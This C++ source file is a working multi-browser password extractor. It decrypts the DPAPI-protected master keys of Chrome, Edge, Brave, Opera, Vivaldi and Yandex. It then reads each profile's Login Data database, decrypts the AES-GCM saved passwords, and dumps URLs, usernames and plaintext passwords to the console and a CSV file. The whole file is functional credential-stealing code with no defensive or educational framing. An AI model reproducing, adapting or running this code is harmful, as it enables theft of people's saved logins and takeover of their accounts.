#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <sqlite3.h>
#pragma comment(lib, "sqlite3.lib")
#include <cryptopp/gcm.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/hex.h>
#include <cryptopp/base64.h>
#include <cryptopp/osrng.h>
#include <nlohmann/json.hpp>
#include <shlobj.h>

namespace fs = std::filesystem;
using json = nlohmann::json;

struct BrowserInfo {
    std::string name;
    std::string local_state_path;
    std::string user_data_path;
};

std::vector<BrowserInfo> browsers = {
    {"Chrome", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\"},
    {"Edge", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\"},
    {"Brave", "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\"},
    {"Opera", "%APPDATA%\\Opera Software\\Opera Stable\\Local State", "%APPDATA%\\Opera Software\\Opera Stable\\"},
    {"Vivaldi", "%LOCALAPPDATA%\\Vivaldi\\User Data\\Local State", "%LOCALAPPDATA%\\Vivaldi\\User Data\\"},
    {"Yandex", "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Local State", "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\"}
};

// safe env var
std::string expand_env(const std::string& path) noexcept {
    char buffer[MAX_PATH * 2] = { 0 };
    DWORD result = ExpandEnvironmentStringsA(path.c_str(), buffer, MAX_PATH * 2);
    if (result > 0 && result < MAX_PATH * 2) {
        return std::string(buffer);
    }
    return path;
}

// gettin userprofile name
std::string get_user_profile() noexcept {
    char buffer[MAX_PATH] = { 0 };
    DWORD size = GetEnvironmentVariableA("USERPROFILE", buffer, MAX_PATH);
    if (size > 0 && size < MAX_PATH) {
        return std::string(buffer);
    }
    return "";
}

// size_t to dword
std::string read_file(const std::string& path) noexcept {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return "";

    auto end = file.tellg();
    file.seekg(0, std::ios::beg);

    DWORD file_size = static_cast<DWORD>(end - file.tellg());
    if (file_size == 0) return "";

    std::string contents;
    contents.resize(file_size);
    file.read(contents.data(), file_size);
    return contents;
}

std::vector<BYTE> decrypt_dpapi(const std::vector<BYTE>& data) noexcept {
    DATA_BLOB in_blob;
    in_blob.cbData = static_cast<DWORD>(data.size());
    in_blob.pbData = const_cast<BYTE*>(data.data());

    DATA_BLOB out_blob = { 0 };
    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        std::vector<BYTE> result(out_blob.pbData, out_blob.pbData + out_blob.cbData);
        LocalFree(out_blob.pbData);
        return result;
    }
    return {};
}

std::vector<BYTE> base64_decode(const std::string& input) noexcept {
    try {
        std::string decoded;
        CryptoPP::StringSource ss(input, true,
            new CryptoPP::Base64Decoder(
                new CryptoPP::StringSink(decoded)
            )
        );

        return std::vector<BYTE>(decoded.begin(), decoded.end());
    }
    catch (...) {
        return {};
    }
}

// AES-GCM decryption - fixed afer fucking 200 comps
std::string decrypt_aes_gcm(const std::vector<BYTE>& key, const std::vector<BYTE>& ciphertext) noexcept {
    try {
		// minimal size check
        if (ciphertext.size() < 35) return "";

        // Weryfikacja prefixu v10/v11
        if (ciphertext[0] != 'v' || ciphertext[1] != '1' ||
            (ciphertext[2] != '0' && ciphertext[2] != '1')) {
            return "";
        }

		// get iv, data, tag
        std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
        std::vector<BYTE> data(ciphertext.begin() + 15, ciphertext.end() - 16);
        std::vector<BYTE> tag(ciphertext.end() - 16, ciphertext.end());

        std::string plaintext;
        CryptoPP::GCM<CryptoPP::AES>::Decryption dec;
        dec.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());

        CryptoPP::AuthenticatedDecryptionFilter df(
            dec,
            new CryptoPP::StringSink(plaintext),
            CryptoPP::AuthenticatedDecryptionFilter::THROW_EXCEPTION,
			16  // size of the authentication tag
        );

        df.ChannelPut(CryptoPP::DEFAULT_CHANNEL, data.data(), data.size());
        df.ChannelPut(CryptoPP::DEFAULT_CHANNEL, tag.data(), tag.size());
        df.ChannelMessageEnd(CryptoPP::DEFAULT_CHANNEL);
        return plaintext;
    }
    catch (const CryptoPP::Exception& e) {
        std::cerr << "[CryptoPP Error] " << e.what() << std::endl;
        return "";
    }
    catch (...) {
        return "";
    }
}


// gettin master key
std::vector<BYTE> get_master_key(const std::string& local_state_path) noexcept {
    std::string content = read_file(local_state_path);
    if (content.empty()) return {};

    try {
        json j = json::parse(content);
        if (!j.contains("os_crypt") || !j["os_crypt"].contains("encrypted_key")) {
            return {};
        }

        std::string encrypted_key_b64 = j["os_crypt"]["encrypted_key"];
        std::vector<BYTE> encrypted_key = base64_decode(encrypted_key_b64);

        if (encrypted_key.size() < 5) return {};
        encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5);

        return decrypt_dpapi(encrypted_key);
    }
    catch (...) {
        return {};
    }
}

// Global CSV file and index
std::ofstream csv_file;
int global_index = 0;

// opening login db
sqlite3* open_login_db(const std::string& db_path, const std::string& temp_name) noexcept {
    try {
        // Copy with retries for locked files
        for (int attempt = 0; attempt < 5; ++attempt) {
            try {
                fs::copy_file(db_path, temp_name, fs::copy_options::overwrite_existing);
                break;
            }
            catch (const fs::filesystem_error&) {
                Sleep(200);
            }
        }
    }
    catch (...) {
        return nullptr;
    }

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(temp_name.c_str(), &db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nullptr) == SQLITE_OK) {
        sqlite3_exec(db, "PRAGMA journal_mode = WAL;", nullptr, nullptr, nullptr);
        sqlite3_exec(db, "PRAGMA synchronous = NORMAL;", nullptr, nullptr, nullptr);
        return db;
    }
    return nullptr;
}

// extractin passwords from profile
void extract_profile_passwords(const std::vector<BYTE>& master_key,
    const std::string& profile_path,
    const std::string& browser_name) noexcept {

    std::string db_path = profile_path + "\\Login Data";
    if (!fs::exists(db_path)) return;

    std::string temp_db = "temp_" + browser_name + ".db";
    sqlite3* db = open_login_db(db_path, temp_db);
    if (!db) {
        std::cout << "[SKIP] Cannot access DB: " << db_path << "\n";
        return;
    }

    sqlite3_stmt* stmt = nullptr;
    const char* query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND length(password_value) > 0";

    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
        int local_count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* url = sqlite3_column_text(stmt, 0);
            const unsigned char* username = sqlite3_column_text(stmt, 1);
            const void* password_data = sqlite3_column_blob(stmt, 2);
            int password_size = sqlite3_column_bytes(stmt, 2);

            if (url && username && password_data && password_size > 0) {
                std::vector<BYTE> ciphertext(reinterpret_cast<const BYTE*>(password_data),
                    reinterpret_cast<const BYTE*>(password_data) + password_size);

                std::string password = decrypt_aes_gcm(master_key, ciphertext);
                if (!password.empty()) {
                    std::cout << "[FOUND] " << browser_name << " #" << global_index
                        << " | " << reinterpret_cast<const char*>(url)
                        << " | " << reinterpret_cast<const char*>(username)
                        << " | " << password << "\n";

                    csv_file << global_index << "," << browser_name << ","
                        << reinterpret_cast<const char*>(url) << ","
                        << reinterpret_cast<const char*>(username) << ","
                        << password << "\n";
                    global_index++;
                    local_count++;
                }
            }
        }
        std::cout << "[INFO] " << browser_name << " extracted " << local_count << " passwords\n";
        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);
    fs::remove(temp_db);
}

// Extract browser passwords
void extract_browser_passwords(const BrowserInfo& browser) noexcept {
    std::string local_state_path = expand_env(browser.local_state_path);
    std::string user_data_path = expand_env(browser.user_data_path);

    std::cout << "\n=== " << browser.name << " ===\n";
    std::cout << "Local State: " << local_state_path << "\n";

    if (!fs::exists(local_state_path)) {
        std::cout << "[SKIP] Local State not found\n";
        return;
    }

    std::vector<BYTE> master_key = get_master_key(local_state_path);
    if (master_key.empty()) {
        std::cout << "[ERR] Master key decryption failed\n";
        return;
    }

    std::cout << "[OK] Master key OK (" << master_key.size() << " bytes)\n";

    // Scan profiles
    if (fs::exists(user_data_path)) {
        for (const auto& entry : fs::directory_iterator(user_data_path)) {
            if (entry.is_directory()) {
                std::string profile_name = entry.path().filename().string();
                if (profile_name == "Default" || profile_name.rfind("Profile", 0) == 0) {
                    std::cout << "--- " << profile_name << " ---\n";
                    extract_profile_passwords(master_key, entry.path().string(), browser.name);
                }
            }
        }
    }
}

void runSavedPasswords() {
    std::cout << "=== Multi-Browser Password Extractor v2.1 ===\n";
    std::cout << "Run as Administrator + Close all browsers!\n\n";

    // Initialize CSV
    csv_file.open("browser_passwords.csv");
    if (!csv_file.is_open()) {
        std::cerr << "[FATAL] Cannot create CSV file\n";
    }
    csv_file << "ID,Browser,URL,Username,Password\n";
    global_index = 0;

    // Process all browsers
    for (const auto& browser : browsers) {
        extract_browser_passwords(browser);
    }

    csv_file.close();

    std::cout << "\n[COMPLETE] " << global_index << " passwords -> browser_passwords.csv\n";

    // Cleanup
    for (const auto& entry : fs::directory_iterator(fs::current_path())) {
        std::string filename = entry.path().filename().string();
        if (filename.find("temp_") == 0 && entry.is_regular_file()) {
            fs::remove(entry.path());
        }
    }

    std::cout << "Done. Check browser_passwords.csv\n";
    std::cout << "Press Enter to exit...";
    std::cin.get();
}